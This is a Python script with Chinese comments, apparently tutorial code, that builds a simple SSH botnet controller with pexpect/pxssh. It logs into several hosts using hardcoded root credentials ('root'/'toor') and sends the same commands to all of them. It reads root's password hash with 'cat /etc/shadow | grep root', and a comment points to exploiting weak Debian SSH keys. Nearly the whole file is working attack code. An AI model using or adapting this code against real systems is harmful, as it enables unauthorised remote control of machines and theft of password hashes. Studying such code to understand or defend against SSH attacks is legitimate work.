"""
僵尸网络

pxssh:Pexpect 模块附带的脚本,它可以直接与 SSH 会话进行交互,通过预先定义的login(),logout(),prompt()函数。

服务器为登陆 SSH 的用户产生他们的密钥。通常,这提供了一个极好的验证方式。通过生成 1024 位,2048 位或者 4096 位的密钥使我们很难用弱口令暴力破解
"""
# ssh root@127.0.0.1
# Are you sure you want to continue connecting (yes/no)? yes
# Password:**************
# uname -v

import pexpect
import pexpect.pxssh

import time
import threading

PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


# def connect(user, host, password):
#     ssh_newkey = 'Are you sure you want to continue connecting'
#     connStr = 'ssh ' + user + '@' + host
#     child = pexpect.spawn(connStr)
#     ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
#     if ret == 0:
#         print('[-] Error Connecting')
#         return
#     if ret == 1:
#         child.sendline('yes')
#         ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
#     if ret == 0:
#         print('[-] Error Connecting')
#         return
#     child.sendline(password)
#     child.expect(PROMPT)
#     return child

def connect(host, user, password):
    try:
        s = pexpect.pxssh.pxssh()
        s.login(host, user, password)
        return s
    except:
        print('[-] Error Connecting')
        exit(0)

def main():
    host = 'localhost'
    user = 'root'
    password = 'toor'
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')

# 通过弱密钥利用 SSH
# 代码自动分析工具
# debian_ssh_dsa_1024_x86.tar.bz2


# 构建 SSH 的僵尸网络

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pexpect.pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print('[*] Output from ' + client.host)
        print('[+] ' + output + '\n')


def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)

botNet = []
# 添加客户端
addClient('10.10.10.110', 'root', 'toor')
addClient('10.10.10.120', 'root', 'toor')
addClient('10.10.10.130', 'root', 'toor')
botnetCommand('uname -v')
botnetCommand('cat /etc/issue')

if __name__ == '__main__':
    main()
    # attacker  # ssh-kengen
    # attacker  # service ssh start
    # attacker  # python sshCommand.py
    # cat / etc / shadow | grep root